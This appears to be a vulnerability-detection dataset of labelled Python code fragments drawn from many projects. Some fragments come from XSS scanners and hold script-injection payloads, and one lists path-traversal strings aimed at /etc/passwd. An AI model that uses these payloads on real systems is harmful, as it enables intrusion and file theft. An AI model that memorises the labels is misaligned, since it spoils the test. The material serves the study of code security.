": xss payload url \"\"\" super(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags", "label": 0}, {"snippet_id": 20672, "code": " url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'),", "label": 0}, {"snippet_id": 35623, "code": "='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe", "label": 0}, {"snippet_id": 53804, "code": "(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str(result) +\"'\" +\"<marquee style='background:red", "label": 1}, {"snippet_id": 30749, "code": " \t\tprint('<center><h3>You %s %s on HAproxy %s. <a href=\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />' %(enable", "label": 0}, {"snippet_id": 29620, "code": "'UTF-8') \t\t\t \t\tfor line in stderr.read().decode(encoding='UTF-8'): \t\t\tif line: \t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\") \ttry:\t \t\tssh.close() \texcept: \t\tprint(\"<div class='alert alert", "label": 0}, {"snippet_id": 52881, "code": ": %s' %(_('The Oozie server is not running'), detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow", "label": 0}, {"snippet_id": 10640, "code": " log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up", "label": 0}, {"snippet_id": 36950, "code": "\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t", "label": 0}, {"snippet_id": 12887, "code": "(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'", "label": 0}, {"snippet_id": 23354, "code": ".get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth", "label": 0}, {"snippet_id": 31904, "code": " alert-success\" style=\"margin:10px\">Edited '+form.getvalue('color')+' list was uploaded to '+server[1]+'</div>') \t\t\tif form.getvalue('bwlists_restart')=='restart': \t\t\t\tfunct.ssh_command(server[2],[\"sudo", "label": 0}, {"snippet_id": 10614, "code": " import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests", "label": 0}, {"snippet_id": 25306, "code": " value=self.decompress(value) output=[] final_attrs=self.build_attrs(attrs or dict()) if 'required' in final_attrs: del final_attrs['required'] id_=final_attrs.get('id', None) for i, widget in enumerate", "label": 0}, {"snippet_id": 31156, "code": "\t\t \tos.system(\"rm -f %s\" % script) \t if form.getvalue('haproxyaddserv'): \tfunct.install_haproxy(form.getvalue('haproxyaddserv'), syn_flood=form.getvalue('syn_flood')) \t if form.getvalue('installwaf'): ", "label": 0}, {"snippet_id": 28155, "code": ".get_user_role_by_uuid(user_id.value) except: \tpass hap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') if serv is not None: \tcfg=hap_configs_dir +serv +\"-\" +funct.get_data('config", "label": 0}, {"snippet_id": 10478, "code": "\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter", "label": 0}, {"snippet_id": 17233, "code": "'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P", "label": 0}, {"snippet_id": 698, "code": " if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True", "label": 0}, {"snippet_id": 39299, "code": " database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict", "label": 0}, {"snippet_id": 23510, "code": "+=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir", "label": 0}, {"snippet_id": 25887, "code": ".parse(initial.answer).time() if initial and initial.answer else None, widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')), ) elif q.type==Question.TYPE_DATETIME: field", "label": 0}, {"snippet_id": 46191, "code": "'format', 'plain')=='json': return JsonResponse({ 'collection': collection.get_props(request.user), 'query': query, 'initial':{ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST", "label": 0}, {"snippet_id": 5131, "code": "(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t", "label": 0}, {"snippet_id": 48833, "code": ".verbose_name.title() try: field=getattr(self.model, self.field_name) except AttributeError as e: return self.field_name.title() if callable(field) and getattr(field, 'short_description', False): return field", "label": 0}, {"snippet_id": 18226, "code": ", name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index", "label": 1}, {"snippet_id": 33246, "code": " found' % build_id) self.abort(404) return self.redirect(str(build.url)) class TaskCancelSwarmingTask(webapp2.RequestHandler): \"\"\"Cancels a swarming task.\"\"\" @decorators.require_taskqueue('backend-default')", "label": 0}, {"snippet_id": 48199, "code": "\" +str(e)) return redirect(\"/admin/media/add\") def action_add_multiple_media(request: HttpRequest): try: category: str=request.POST[\"category\"] files=request.FILES.getlist('files') user: Profile=get_current_user", "label": 0}, {"snippet_id": 11456, "code": "'--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains", "label": 0}, {"snippet_id": 54065, "code": ",bypass=True) pr=proxy.get() if len(pr)==0: pr=None if method.get()==\"GET\": get=True post=False elif method.get()==\"POST\": get=False post=True else: get=True post=True fresh=False if refresh.get()==\"On", "label": 0}, {"snippet_id": 12396, "code": ".grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 5845, "code": " self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +='", "label": 0}, {"snippet_id": 218, "code": " xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\"", "label": 1}, {"snippet_id": 55065, "code": ".is_valid(): return HttpResponseBadRequest(form.errors.as_json()) locale=get_object_or_404(Locale, code=form.cleaned_data['locale']) entities=Entity.objects.filter(pk__in=form.cleaned_data['entities'])", "label": 1}, {"snippet_id": 50530, "code": " in from the ajax client. The requests should be tagged with different modes depending on what needs to be done, such as initializing or sending/receving data through the request. It uses a long-polling", "label": 0}, {"snippet_id": 36883, "code": " frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered", "label": 1}, {"snippet_id": 19488, "code": " expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp", "label": 0}, {"snippet_id": 18165, "code": "', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views", "label": 0}, {"snippet_id": 2915, "code": ".replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1", "label": 0}, {"snippet_id": 47223, "code": "'Records' in menu_items assert menu_items['Records'].is_category() submenu_items={ str(item.name): item for item in menu_items['Records'].get_children()} assert 'Record Metadata' in submenu_items assert", "label": 0}, {"snippet_id": 9205, "code": ")$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/", "label": 1}, {"snippet_id": 10902, "code": ".run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode...", "label": 0}, {"snippet_id": 15954, "code": "}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course", "label": 0}, {"snippet_id": 39909, "code": ".flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"", "label": 0}, {"snippet_id": 12320, "code": "<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 4015, "code": " uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in", "label": 0}, {"snippet_id": 31283, "code": "('uuid')\t \tservers=sql.select_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp[serv]={} \t\tmetric=sql.select_metrics(serv) \t\tmetrics={} \t\t \t\tfor i", "label": 0}, {"snippet_id": 26240, "code": " 'vat_id' in self.changed_data or not data.get('vat_id'): self.instance.vat_id_validated=False self.instance.name_parts=data.get('name_parts') if self.validate_vat_id and self.instance.vat_id_validated", "label": 0}, {"snippet_id": 17463, "code": ".MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 2930, "code": "(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is", "label": 0}, {"snippet_id": 20117, "code": " def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT", "label": 0}, {"snippet_id": 44317, "code": " request.user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor", "label": 0}, {"snippet_id": 19534, "code": " num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command", "label": 0}, {"snippet_id": 37624, "code": "\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions", "label": 0}, {"snippet_id": 2980, "code": ".insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if", "label": 0}, {"snippet_id": 53898, "code": " Xss..]\\n\\n') print(colored('\\n\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET", "label": 1}, {"snippet_id": 15805, "code": ".extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs", "label": 0}, {"snippet_id": 10739, "code": "*kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir", "label": 0}, {"snippet_id": 9739, "code": "'RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P", "label": 0}, {"snippet_id": 19955, "code": "() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache", "label": 0}, {"snippet_id": 4950, "code": "', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc", "label": 0}, {"snippet_id": 52884, "code": " Oozie server is not running'), detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow", "label": 0}, {"snippet_id": 11953, "code": "', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),", "label": 0}, {"snippet_id": 52506, "code": "} for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}'", "label": 0}, {"snippet_id": 14443, "code": "(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings", "label": 0}, {"snippet_id": 31236, "code": "'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure, output_file, show \tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker \tfrom bokeh.layouts import", "label": 0}, {"snippet_id": 17473, "code": "(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings", "label": 0}, {"snippet_id": 41136, "code": "\t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1)", "label": 0}, {"snippet_id": 21855, "code": "'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns", "label": 0}, {"snippet_id": 46986, "code": "(MC_KEY_COMMNET_IDS_LIKED_BY_USER %( '{user_id}', '{self.id}'), ONE_HOUR) async def comment_ids_liked_by(self, user_id): cids=[c.id for c in await self.comments] if not cids: return[] queryset=await ReactItem.filter", "label": 0}, {"snippet_id": 38661, "code": " BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self", "label": 0}, {"snippet_id": 21955, "code": "-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r", "label": 0}, {"snippet_id": 32119, "code": "(self, request, obj_id): api.keystone.mapping_delete(request, obj_id) class MappingFilterAction(tables.FilterAction): def filter(self, table, mappings, filter_string): \"\"\"Naive case-insensitive search.\"\"\"", "label": 0}, {"snippet_id": 11243, "code": "-with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against", "label": 0}, {"snippet_id": 1034, "code": " xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0]", "label": 1}, {"snippet_id": 5617, "code": "<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l", "label": 0}, {"snippet_id": 11994, "code": "*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch", "label": 0}, {"snippet_id": 33665, "code": "=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t", "label": 0}, {"snippet_id": 44566, "code": " uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2", "label": 0}, {"snippet_id": 38031, "code": ": \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext", "label": 0}, {"snippet_id": 16429, "code": ".redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key=", "label": 0}, {"snippet_id": 35685, "code": "'Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\"", "label": 0}, {"snippet_id": 39719, "code": "): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname", "label": 0}, {"snippet_id": 44623, "code": " workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response['id']=workflow_doc.id response['doc1_id']=workflow_doc.doc.get().id response['message']=_('Page saved !", "label": 0}, {"snippet_id": 29722, "code": "\"\": \t\t\tback=json.dumps(line).split(\"\\\"\") \t\t\tif kwargs.get('ret'): \t\t\t\tret +=back[1] \t\t\t\tret +=\"<br />\" \t\t\telse: \t\t\t\tprint(back[1], end=\"<br>\") \t\t \tif kwargs.get('ret'): \t\treturn ret \t\t def get_files(dir", "label": 0}, {"snippet_id": 27496, "code": ") def add_menu(name, href): \"\"\"Add menu item to the main navigation.\"\"\" _MENU_ITEMS.append(_MenuItem(name, href)) def make_login_url(dest_url): \"\"\"Make the switch account url.\"\"\" return '/login?' +urllib", "label": 0}, {"snippet_id": 49530, "code": "=True) remote_field=self.model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field qs=remote_field.model.objects.filter(pk__in=pks) values=[ SmartFilterValue(self.field_name,", "label": 0}, {"snippet_id": 14170, "code": "'ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include(", "label": 0}, {"snippet_id": 35797, "code": " get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit", "label": 0}, {"snippet_id": 45556, "code": "(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2'", "label": 0}, {"snippet_id": 7989, "code": " name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses", "label": 0}, {"snippet_id": 1276, "code": "=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) if data['scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid", "label": 0}, {"snippet_id": 17360, "code": ".MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$", "label": 0}, {"snippet_id": 42348, "code": "\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json", "label": 0}, {"snippet_id": 42637, "code": "(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\"", "label": 0}, {"snippet_id": 39423, "code": "['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t", "label": 0}, {"snippet_id": 29276, "code": ".get_setting('tmp_config_path') +\"/\" +get_data('config') +\".cfg\" \terror=\"\" \t \ttry: \t\tos.system(\"dos2unix \"+cfg) \texcept OSError: \t\treturn 'Please install dos2unix' \t\tpass \t \tif kwargs.get(\"keepalived\")==1: \t\tif", "label": 0}, {"snippet_id": 53134, "code": "=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_coordinator(request): response={'status': -1} coordinator_dict=json.loads(request.POST.get('coordinator',", "label": 0}, {"snippet_id": 26433, "code": " id=\\\"x\", \"</script><script>alert(1);</script>\", \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\", \"<img src=test123456.jpg onerror=alert(1)>\"] lfi_attacks=[ '../../etc", "label": 0}, {"snippet_id": 3235, "code": " xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req", "label": 0}, {"snippet_id": 54200, "code": ".grid(row=3) Label(main, text=\"User-Agent:\",background='light sky blue').grid(row=4) Label(main, text=\"Payload:\",background='light sky blue').grid(row=5) Label(main, text=\"HTTP Proxy:\",background='light", "label": 0}, {"snippet_id": 50366, "code": " to the server. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) sess=self.sessionhandler.sessions_from_csessid(csessid", "label": 0}, {"snippet_id": 12652, "code": ", 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 15325, "code": ") self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity", "label": 0}, {"snippet_id": 14967, "code": "\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure", "label": 0}, {"snippet_id": 245, "code": " xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid): xss_payloads=fetch_xss_payload() xss_get_method", "label": 1}, {"snippet_id": 43948, "code": "=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{", "label": 0}, {"snippet_id": 26533, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc/passwd%00', '../../../etc/passwd%00'", "label": 0}, {"snippet_id": 51478, "code": "'websecmap.map', 'websecmap.pro', 'dashboard.internet_nl_dashboard', 'django_otp', 'django_otp.plugins.otp_static', 'django_otp.plugins.otp_totp', 'two_factor', ] try: if not os.environ.get('COMPRESS', False):", "label": 0}, {"snippet_id": 17717, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset", "label": 0}, {"snippet_id": 33350, "code": ".BuildsApi()) return[ webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases', expiration.CronExpireBuildLeases), webapp2.Route(r'/internal/cron/buildbucket/expire_builds', expiration.CronExpireBuilds),", "label": 0}, {"snippet_id": 10406, "code": " test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes", "label": 0}, {"snippet_id": 52692, "code": ".find_all_parameters(with_lib_path=False) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': ", "label": 0}, {"snippet_id": 40048, "code": " \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn", "label": 0}, {"snippet_id": 11175, "code": " bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not", "label": 0}, {"snippet_id": 43645, "code": "\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and", "label": 0}, {"snippet_id": 31597, "code": ",xwheel_zoom\", \t\t\ttitle=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips", "label": 0}, {"snippet_id": 2896, "code": " xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query", "label": 0}, {"snippet_id": 2952, "code": " vulnerable to 